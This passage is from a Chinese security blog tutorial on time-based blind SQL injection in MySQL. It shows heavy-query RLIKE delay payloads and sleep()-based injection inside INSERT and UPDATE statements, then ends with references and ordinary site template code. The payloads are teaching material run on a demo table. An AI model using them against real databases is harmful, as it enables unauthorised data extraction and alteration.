+mysql&gt; select * from vorname where Vorname='Lina' and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
+Empty set (6.20 sec)
+</code></pre></div></div>
+
+<p>😇<strong>IF(0,x,y)</strong>时，执行<strong>y</strong>，<strong>IF(1,x,y)</strong>时，执行<strong>x</strong></p>
+
+<p>😇<strong>rpad(1,999999,’a’)</strong>的意思是在1后面补a，使得一共999999位</p>
+
+<p>😇然后通过<strong>rlike</strong>判断字符串是不是形如<strong>aaaaaab</strong>，肯定没有后面这个<strong>b</strong>啦，返回值0</p>
+
+<h1 id="insert-和-update-的盲注">insert 和 update 的盲注</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>insert into vorname values (16,'sueisok','0'| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1));
+
+update vorname set Alt = 21|if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) where Nachname='sueisok';
+</code></pre></div></div>
+
+<p>但这个会影响数据库数据</p>
+
+<h1 id="refer">Refer</h1>
+
+<p><a href="shenmedoumeiyou">https://xz.aliyun.com/t/5505</a></p>
+
+<p><a href="dianjibunengtiaozhuan">https://www.k0rz3n.com/2019/02/21/一篇文章带你深入理解 SQL 盲注/</a></p>
+
+<p><a href="dianji">https://blog.csdn.net/ouyn8/article/details/44674563</a></p>
+
+<p><a href="hahaha">https://blog.csdn.net/yuanjiu4221/article/details/82661424</a></p>
+
+  <!-- Introducing the share module -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'weibo'
+        ,
+        
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        
+      
+    ],
+    wechatQrcodeTitle: "Share to WeChat circle",
+    wechatQrcodeHelper: 'I look forward to seeing this article in the circle of friends.'
+  });
+</script>
+
+</div>
+
+<!-- Bottom anchor -->
+<a id="htmldown" name="htmldown"></a>
+<!-- Introducing the comment module -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODI3Ny8yNDc3MQ=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>Please activate JavaScript for normal use.</noscript>
+    <!-- City version code installation has been completed -->
+
+
+
+
+
+<!-- Introducing the goto module -->
+<div class="bounceInRight animated go">
+  <a title="Top switch page" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="At the bottomlivere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- Introduce the module at the bottom of the page -->
+
+<footer id="bottom">
+  <script src="/assets/css/bootstrap.min.css"></script>
+
+<!-- START BREADCRUMBS -->
+<nav aria-label="breadcrumb">
+
+  <ol class="breadcrumb">
+  
+  
+  
+  </ol>
+</nav>
+
+<!-- END BREADCRUMBS -->
+
+
+<div id="breadcrumbs">
+
+<a href="/">Home</a>
+
+  
+    / <a href="/blog/">Blog</a>
+  
+
+  
+    / Sqli time based
+  
+
+</div>
+<style>
+#breadcrumbs {margin-left: 0
+
+      font-size: 10rem;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1rem;
+      list-style: none;
+      background-color: # #fcfcfc;
+      border-radius: 0.25rem;
+
+      content: "";
+      display: table;
+      clear: both;
+
+      float: left;
+
+      display: inline-block;
+      padding-right: 0.5rem;
+      padding-left: 0.5rem;
+      color: #818a91;
+      content: "/";
+
+      text-decoration: underline;
+
+      text-decoration: none;
+
+}
+</style>
+
+  <br>
+  <span>sueisok ©
+  
+  
+  2020
+  <br>
+  Powered by <a href="https://www.jekyll.com/">Jekyll</a> | <a href="https://github.com/JonyBepary/HardCandy-Jekyll-Mod">HardCandy-Jekyll Mod</a></span>
+</footer>
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="/assets/js/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+
+
+<!-- Quote the animation effect of wow.js -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- Page refreshes back to top -->
+<script>
+    window.onbeforeunload = function(){
+        //The page automatically returns to the top after refreshing
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+
+<!-- preloder script -->
+<!-- end -->
+<script>
+//open external links in a new window
+function external_new_window() {
+    for(var c = document.getElementsByTagName("a"), a = 0;a < c.length;a++) {
+    var b = c[a];
+    b.getAttribute("href") && b.hostname !== location.hostname
+    }
+}
+//open PDF links in a new window
+function pdf_new_window ()
+{
+    if (!document.getElementsByTagName) return false;
+    var links = document.getElementsByTagName("a");
+    for (var eleLink=0; eleLink < links.length; eleLink ++) {
+    if ((links[eleLink].href.indexOf('.pdf') !== -1)||(links[eleLink].href.indexOf('.doc') !== -1)||(links[eleLink].href.indexOf('.docx') !== -1)) {
+        links[eleLink].onclick =
+        function() {
+            window.open(this.href);
+            return false;
+        }
+    }
+    }
+}
+pdf_new_window()
+external_new_window();
+</script>
+
+<style>
+.videoWrapper {
+    position: relative;
+    padding-bottom: 56.333%;
+    height: 0;
+    background: black;
+}
+.videoWrapper iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: 0;
+}
+</style>
+
+<script>
+function get_youtube_id(url) {
+    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
+    return (url.match(p)) ? RegExp.$1 : false;
+}
+function vimeo_embed(url,el) {
+    var id = false;
+    $.ajax({
+      url: 'https://vimeo.com/api/oembed.json?url='+url,
+      async: true,
+      success: function(response) {
+        if(response.video_id) {
+          id = response.video_id;
+          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
+          if(autoplay==1) theInnerHTML += '&autoplay=1';
+          if(loop==1) theInnerHTML += '&loop=1';
+          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>';
+          el.innerHTML = theInnerHTML;
+        }
+      }
+    });
+}
+function video_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        //check if this is an external url (that starts with https:// or http://
+        if (p[i].innerHTML.indexOf("http://") == 0 ||
+            p[i].innerHTML.indexOf("https://") == 0) {
+            var youtube_id = get_youtube_id(p[i].innerHTML);
+            if(youtube_id) {
+                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
+                if(autoplay==1) theInnerHTML += '&autoplay=1';
+                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
+                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
+                p[i].innerHTML = theInnerHTML;
+            }
+            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
+                //ask vimeo for the id and place the embed
+                vimeo_embed(p[i].innerHTML,p[i]);
+            }
+        }
+    }
+}
+video_embed();
+
+function mp3_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
+            var str = p[i].innerHTML.split('?');
+            if(str.length == 1) str[1] = '';
+            var str1 = str[1];
+            str1 = str1.replace('&','').replace('&','');
+            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
+            str1 = str1.replace('loop=1','').replace('loop=0','');
+            str1 = str1.replace('controls=0','').replace('controls=1','');
+
+            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
+                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
+                var newInnerHTML = '<audio';
+                if(autoplay==1) newInnerHTML += ' autoplay';
+                if(loop==1) newInnerHTML += ' loop';
+                if(controls==1) newInnerHTML += ' controls';
+                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
+                p[i].innerHTML = newInnerHTML;
+            }
+        }
+    }
+}
+mp3_embed();
+</script>
+
+
+<!-- preloder script -->
+<script>
+    var preloader = document.getElementById("loader");
+    function loaderFunc(){
+      preloader.style.display = 'none';
+    };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<!-- end -->
+
+</body>
+</html>
